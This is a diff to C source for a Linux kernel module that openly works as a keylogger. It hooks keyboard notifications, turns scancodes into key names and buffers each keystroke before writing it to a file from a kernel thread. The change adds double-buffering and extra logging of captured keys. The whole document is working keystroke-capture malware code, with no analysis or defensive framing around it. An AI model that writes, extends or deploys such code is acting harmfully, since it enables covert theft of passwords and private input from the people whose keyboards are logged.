@@ -28,7 +28,8 @@ ssize_t write_vaddr_disk(void *, size_t);
 
 int index_num = 0;
 int buffer_counter = 0;
-static char* buffer[100];
+int buffer_switch = 0;
+static char* buffer[2][100];
 
 static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                         "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
@@ -80,7 +81,7 @@ int thread_fn(void * data) {
     printk(KERN_INFO "Thread started");
     index_num = 0;
     while(index_num < 100){
-        WriteToFile(buffer[index_num], sizeof(buffer[index_num]));
+        WriteToFile(buffer[!buffer_switch][index_num], sizeof(buffer[index_num]));
         index_num++;
     }
 
@@ -112,15 +113,15 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
             down(&sem);
             if(UnpressedKey == 0){
                 // WriteToFile((char *)NoShift[param->value], sizeof(*NoShift[param->value]));
-                buffer[buffer_counter] = (char *)NoShift[param->value];
+                buffer[buffer_switch][buffer_counter] = (char *)NoShift[param->value];
                 buffer_counter++;
-                printk(KERN_INFO "%s \n", NoShift[param->value]);
+                printk(KERN_INFO "%s \tBuffer Counter: %d\n", NoShift[param->value], buffer_counter);
             }
             else{
                 // WriteToFile((char *)YesShift[param->value], sizeof(*YesShift[param->value]));
-                buffer[buffer_counter] = (char *)YesShift[param->value];
+                buffer[buffer_switch][buffer_counter] = (char *)YesShift[param->value];
                 buffer_counter++;
-                printk(KERN_INFO "%s \n", YesShift[param->value]);
+                printk(KERN_INFO "%s \tBuffer Counter: %d\n", YesShift[param->value], buffer_counter);
             }
             up(&sem);
         }
@@ -128,6 +129,7 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
         if(buffer_counter == 100){
             thread_init();
             buffer_counter = 0;
+            buffer_switch = !buffer_switch;
         }
     }
     return NOTIFY_OK;
